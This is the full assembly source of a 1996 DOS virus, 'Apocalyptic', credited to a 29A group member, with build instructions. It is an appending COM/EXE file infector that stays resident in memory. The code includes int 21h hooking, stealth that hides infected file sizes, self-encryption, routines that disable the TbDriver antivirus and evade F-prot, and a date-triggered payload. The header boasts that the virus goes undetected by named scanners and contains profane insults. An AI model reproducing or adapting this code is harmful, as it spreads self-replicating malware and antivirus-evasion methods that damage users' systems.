;   Virus name:     Apocalyptic
;   Author:         WiNTeRMuTe/29A
;   Size:           1058 bytes
;   Origin:         Madrid, Spain
;   Finished:       October, 1996 ( with a pair of corrections after that )
;
;
;       Characteristics and curiosities
;
;   - TSR appending Com/Exe infector
;   - Has a routine to encrypt and another to decrypt ( ror+add+xor )
;   - Stealth ( 11h/12h/4eh/4fh/5700h )
;   - Deactivates Tbdriver when going into mem and when infecting
;   - Makes the int 3h point to the int21h on infection
;   - Fools f-prot's 'stealth detection'
;   - Non-detectable ( in 2nd generation ) by Tbav 7.05, F-prot 2.23c, Scan,
; Avp and else. TbClean doesn't clean it ( it gets lost with the Z Mcb
; searching loop,... really that product is a shit )
;   - Payload: On 26th of July it shows all file with size 029Ah ( 666 )
;
;
;       Thanks go to:
;
;   - All the 29A staff; rulez ! Specially in the spanish scene to MrSandman,
;  VirusBuster, Griyo, Mr.White, Avv, Anibal and ORP
;   - Living Turmoil, specially Warblade and Krackbaby... go on with the mags!
;   - H/P/C/A/V people in my bbs like Patuel, the Black Rider, MegaMan,
; Bitspawn, Netrunner, the S.H.E.... and of course to my sysop 'Uni' and the
; other cosysops...
;
;
;       And fucks go to:
;
;   - Some Fidoasses. They know who they are.
;
;
;                  ฤอออออออออออออออออออออออออออออออออออฤ
;
;                  " Why don't you get a life and grow up,
;                why don't you realize that you're fucked up,
;                  why criticize what you don't understand,
;                   why change my words, you're so afraid "
;
;                              ( Sepultura )
;
;                       ฤอออออออออออออออออออออออออฤ
;
;   To assemble the virus, use:
;
;   Tasm virus.asm
;   Tlink virus.obj
;

.286
HOSTSEG segment BYTE
ASSUME CS:HOSTSEG, SS:CODIGO

Host:
    mov ax,4c00h
    int 21h

ends

CODIGO  segment PARA
ASSUME  CS:CODIGO, DS:CODIGO, SS:CODIGO

virus_size      equ virus_end-virus_start
encrypt_size    equ encrypt_end-encrypt_start

virus_start     label byte

org     0h

Letsrock:
                call    delta                   ; Entry for Com/Exe
delta:
                mov     si,sp                   ; ๋-offset
                mov     bp,word ptr ss:[si]
                sub     bp,offset delta
                push    es ax ds

                push    cs
                pop     ds
                call    tomacha                 ; I don't call encryption
                                                ;on first generation

Encrypt_start   label   byte

;***************************************************************************
;                                RESIDENCE
;***************************************************************************


goon:
                push    es
                call    tbdriver                ; Deactivate TbDriver

                mov     ah,52h                  ; Pick list of lists
                int     21h
                mov     si,es:[bx-2]            ; First MCB
                mov     es,si

Mcb_Loop:
                cmp     byte ptr es:[0],'Z'     ; I search last Mcb.
                je      got_last
cont:           add     si,es:[3]
                inc     si
                mov     es,si
                jmp     Mcb_Loop

got_last:
                pop     dx
                cmp     word ptr es:[1],0h      ; Is it free ?
                je      go_on
                cmp     word ptr es:[1],dx      ; Or with active Psp ?
                jne     exit
go_on:
                cmp     word ptr es:[3],((virus_size+15)/16)+1
                jb      exit                    ; Is there space for me ?

                push    es                      ; If there is, I get resident
                pop     ds
                mov     di,es
                add     di,word ptr es:[3]      ; Residence stuff; nothing
                sub     di,((virus_size+15)/16)      ;special
                push    di
                mov     es,di
                xor     di,di
                xor     si,si
                mov     cx,8
                rep     movsw

                pop     di
                inc     di
                mov     word ptr es:[3],((virus_size+15)/16)+1
                mov     word ptr es:[1],di

                mov     byte ptr ds:[0],'M'
                sub     word ptr ds:[3],((virus_size+15)/16)+1
                mov     di,5
                mov     cx,12
                xor     al,al
                rep     stosb

                push    es cs
                pop     ds ax
                inc     ax
                push    ax
                mov     es,ax
                xor     di,di
                mov     si,bp
                mov     cx,(virus_size)
                rep     movsb

                mov     ax,3521h
                int     21h
                pop     ds
                mov     ds:word ptr [int21h],bx
                mov     ds:word ptr [int21h+2],es
                mov     ah,25h
                lea     dx,main_center
                int     21h

;***************************************************************************
;                              RETURN TO HOST
;***************************************************************************

exit:
                pop     ds ax es

                dec     byte ptr [flag+bp]              ; Was it a Com ?
                jz      era_un_com

                mov     si,ds                   ; Recover stack
                add     si,cs:word ptr [ss_sp+bp]
                add     si,10h
                cli
                mov     ss,si
                mov     sp,cs:word ptr [ss_sp+bp+2]
                sti

                mov     si,ds                   ; Recover CS:IP
                add     si,cs:word ptr [cs_ip+bp+2]
                add     si,10h
                push    si
                push    cs:word ptr [cs_ip+bp]

                retf                            ; Return to host

era_un_com:
                mov     di,100h                 ; If it's a Com, I make
                push    di                      ;it to return
                lea     si,bp+ss_sp
                movsw
                movsb
                ret

condiciones:
                push    cx dx                   ; Payload trigger
                mov     ah,02ah                 ; Activates on 26th july
                int     21h
                cmp     dx,071Ah
                pop     dx cx
                jnz     nain
                stc
                ret
nain:
                clc
                ret

;***************************************************************************
;                                TBDRIVER
;***************************************************************************

Tbdriver:
                xor     ax,ax                   ; Annulates TBdriver,...
                mov     es,ax                   ;really, this Av is a
                les     bx,es:[0084h]           ;megashit.
                cmp     byte ptr es:[bx+2],0eah
                jnz     volvamos
                push    word ptr es:[bx+3]
                push    word ptr es:[bx+5]
                mov     es,ax
                pop     word ptr es:[0086h]
                pop     word ptr es:[0084h]
volvamos:       ret

;***************************************************************************
;                            STEALTH 05700h
;***************************************************************************

Stealth_tiempo:
                pushf
                call    dword ptr cs:[Int21h]   ; Calls Int21h
                push    cx
                and     cl,01fh
                xor     cl,01fh
                pop     cx
                jnz     nada
                or      cl,01fh                 ; Changes seconds
nada:
                retf    2

;****************************************************************************
;                               FCB STEALTH
;****************************************************************************

FCB_Stealth:

                pushf                           ; Stealth of 11h/12h, by
                call    dword ptr cs:[Int21h]   ;FCBs
                test    al,al
                jnz     sin_stealth

                push    ax bx es

                mov     ah,51h
                int     21h
                mov     es,bx
                cmp     bx,es:[16h]
                jnz     No_infectado

                mov     bx,dx
                mov     al,[bx]
                push    ax
                mov     ah,2fh
                int     21h
                pop     ax
                inc     al
                jnz     Normal_FCB
                add     bx,7h
Normal_FCB:
                mov     al,es:[bx+17h]
                and     al,1fh
                xor     al,1fh
                jnz     No_infectado

                sub     word ptr es:[bx+1dh],Virus_size ; Old lenght of
                sbb     word ptr es:[bx+1fh],0          ;file and "normal"
                and     byte ptr es:[bx+17h],0F1h       ;seconds

No_infectado:
                call    condiciones
                jnc     sin_nada

                mov     word ptr es:[bx+1dh],029Ah      ; Virus's payload
                mov     word ptr es:[bx+1fh],0h

sin_nada:
                pop     es bx ax
Sin_stealth:    retf    2

;****************************************************************************
;                                INT 21h
;****************************************************************************

main_center:                                ; The main center !
                cmp     ax,5700h
                jz      stealth_tiempo
                cmp     ah,11h
                jz      fcb_stealth
                cmp     ah,12h
                jz      fcb_stealth
                cmp     ah,4eh
                jz      handle_stealth
                cmp     ah,4fh
                jz      handle_stealth
                cmp     ah,4bh
                je      ejecutar
                jmp     saltito

;****************************************************************************
;                             HANDLE STEALTH
;****************************************************************************

handle_stealth:

                pushf                           ; Handle stealth, functions
                call    dword ptr cs:[Int21h]   ;4eh/4fh
                jc      adios_handle

                pushf
                push    ax es bx cx

anti_antivirus:

                mov     ah,62h
                int     21h

                mov     es,bx                   ; Is it F-prot ?
                mov     es,word ptr es:[2ch]
                xor     bx,bx
                mov     cx,100h
fpr:
                cmp     word ptr es:[bx],'-F'
                jz      sin_infectar            ; Si lo es, pasamos de hacer
                inc     bx                      ;el stealth
                loop    fpr

                mov     ah,2fh
                int     21h

                mov     al,es:[bx+16h]
                and     al,1fh
                xor     al,1fh
                jnz     sin_infectar

                sub     word ptr es:[bx+1ah],Virus_size ; Subs virus size
                sbb     word ptr es:[bx+1ch],0          ;and places coherent
                and     byte ptr es:[bx+16h],0F1h       ;seconds

sin_infectar:
                call    condiciones
                jnc     no_payload

                mov     word ptr es:[bx+1ah],029Ah      ; payload
                mov     word ptr es:[bx+1ch],0h
no_payload:
                pop     cx bx es ax
                popf
adios_handle:
                retf    2

;****************************************************************************
;                             EXE INFECTION
;****************************************************************************

ejecutar:
                pushf
                push    ax bx cx dx si di ds es bp

                mov     di,ds
                mov     si,dx

                call    tbdriver                ; deactivates TbDriver

                mov     ax,3503h                ; Int 3h points to the
                int     21h                     ;int 21h: less size and we
                push    cs                      ;fuck'em a bit
                pop     ds
                mov     ah,25h
                lea     dx,saltito
                int     21h
                push    es bx ax

                mov     ax,3524h                ; We handle int 24h
                int     3h
                mov     ah,25h
                lea     dx,int24h
                int     3h
                push    es bx ax

                mov     ds,di
                mov     dx,si

Noloes:
                mov     ax,4300h                ; Saves and clears file
                int     3h                      ;attributes
                mov     ax,4301h
                push    ax cx dx
                xor     cx,cx
                int     3h

vamos_a_ver_si_exe:

                mov     byte ptr [flag],00h
                mov     ax,3d02h                ; Opens file
                int     3h
                jc      we_close

infect:         xchg    ax,bx

                push    cs
                pop     ds
                mov     ah,3fh                  ; Reads header
                mov     cx,01ch
                lea     dx,cabecera
                int     3h

                mov     al,byte ptr [cabecera]  ; Makes comprobations
                add     al,byte ptr [cabecera+1]
                cmp     al,'M'+'Z'
                jnz     go_close
                cmp     word ptr [cabecera+18h],40h
                jz      go_close
                cmp     word ptr [cabecera+1ah],0
                jnz     go_close                ; If it's all right, goes on
                jmp     conti

go_close:
                mov     ds,di
                mov     dx,si

buscar_final:   cmp     byte ptr ds:[si],0      ; Searches end in ds:si
                je      chequeo
                inc     si
                jmp     buscar_final

chequeo:
                push    cs                      ; Is it a  .COM ?
                pop     es
                lea     di,comtxt
                sub     si,3
                cmpsw
                jne     we_close
                jmp     infeccion_com

we_close:
                jmp     close

conti:
                mov     ax,5700h                ; Time/date of file
                push    ax
                int     3h
                push    dx cx
                and     cl,1fh
                xor     cl,1fh
                jz      close_ant

                call    pointerant
                cmp     ax,0200h
                ja      contt
noinz:          xor     si,si                       ; To avoid changing
                jmp     close_ant                   ;date of non-infected
                                                    ;files
contt:

                push    ax
                pop     si
                shr     ax,4
                shl     dx,12
                add     dx,ax
                sub     dx,word ptr ds:cabecera+8
                push    dx

                and     si,0fh
                push    si
                call    copy
                pop     si

                pop     dx
                mov     ds:word ptr [cs_ip+2],dx
                inc     dx
                mov     ds:word ptr [ss_sp],dx
                mov     ds:word ptr [cs_ip],si
                mov     ds:word ptr [ss_sp+2],((virus_size+100h-15h)/2)*2

                call    pointerant

                mov     cx,200h
                div     cx
                inc     ax
                mov     word ptr [cabecera+2],dx
                mov     word ptr [cabecera+4],ax
                mov     word ptr [cabecera+0ah],((virus_size)/16)+10h

                mov     ax,4200h
                call    pointer
                mov     cx,1ch
                lea     dx,cabecera
                push    cs
                pop     ds
                mov     ah,40h
                int     3h

close_ant:
                pop     cx dx ax
                or      si,si
                je      close
                inc     ax
                or      cl,1fh
                int     3h


close:

                pop     dx cx ax                    ; Attributes
                inc     ax
                int     21h

                mov     ah,03eh
                int     3h

nahyuck:

                pop     ax dx ds                ; Restores Int 24h y 3h
                int     3h
                pop     ax dx ds
                int     3h

                pop     bp es ds di si dx cx bx ax
                popf
                jmp     saltito

Pointerant:
                mov     ax,4202h
Pointer:
                xor     cx,cx
                cwd
                int     3h
                ret

;****************************************************************************
;                             COM INFECTION
;****************************************************************************


infeccion_com:

                mov     ax,3d02h                ; Open
                int     3h
                jc      close
                xchg    bx,ax

                push    cs
                pop     ds

                mov     byte ptr [flag],1h      ; To make the virus know it's
                                                ;a com when restoring
                mov     ax,5700h                ; Time/date
                push    ax
                int     3h
                push    dx cx
                and     cl,1fh
                xor     cl,1fh
                jz      close_ant

quesiquevale:
                mov     ah,3fh                  ; Reads beggining of file
                mov     cx,3
                lea     dx,ss_sp
                int     3h

                call    pointerant              ; Lenght check
                cmp     ax,0200h
                ja      puedes_seguir
                cmp     ax,(0ffffh-virus_size-100h)
                jna     puedes_seguir
alnoin:         jmp     noinz

puedes_seguir:
                sub     ax,3
                mov     word ptr [cabecera],ax

                call    copy                    ; Appending

                mov     ax,4200h
                call    pointer

                mov     ah,40h                  ; Jumping to code at
                lea     dx,salt                 ;beggining
                mov     cx,3h
                int     3h

                jmp     close_ant

;****************************************************************************
;                                  DATA
;****************************************************************************

autor:          db 'Apocalyptic by Wintermute/29A'
comtxt:         db 'COM'
flag:           db 0
salt:           db 0e9h
cabecera:       db 0eh dup (90h)
SS_SP:          dw 0,offset virus_end+100h
Checksum:       dw 0
CS_IP:          dw offset host,0
Cequis:         dw 0,0,0,0

Encrypt_end     label   byte

copy:
                push    cs
                pop     ds
                xor     bp,bp                   ; Don't let bp fuck us
                call    encryptant              ; Encrypts
                mov     ah,40h                  ; Copies
                mov     cx,virus_size
                lea     dx,letsrock
                int     3h
                call    deencrypt               ; Deencrypts
                ret

;****************************************************************************
;                           ENCRYPT ROUTINE
;****************************************************************************

encryptant:
                lea     si,encrypt_end          ; Encrypts
                mov     cx,encrypt_size
enc_loop:       mov     dl,byte ptr [si]
                sub     dl,2h
                xor     dl,0f9h
                ror     dl,4
                mov     byte ptr [si],dl
                dec     si
                loop    enc_loop
                ret

deencrypt:
                lea     si,encrypt_end+bp       ; Deencrypts
                mov     cx,encrypt_size
                mov     di,8
encri:          mov     dl,byte ptr [si]
                mov     al,dl
                rol     dl,4
                xor     dl,0f9h
                add     dl,2h
                mov     byte ptr [si],dl
                dec     si
                loop    encri
                ret

Int24h:         mov     al,3
                ret
Saltito:        db      0eah
int21h:         dw 0,0


virus_end       label byte

tomacha:
                mov     cs:word ptr encrypt_start-2+bp,deencrypt-encrypt_start
                ret
                        ; This is cause I don't like putting a stupid flag,
                        ; this two commands won't be copied

        CODIGO ends
        END Letsrock

 VSTACK segment para STACK 'Stack'

    db  100h dup (90h)

ends

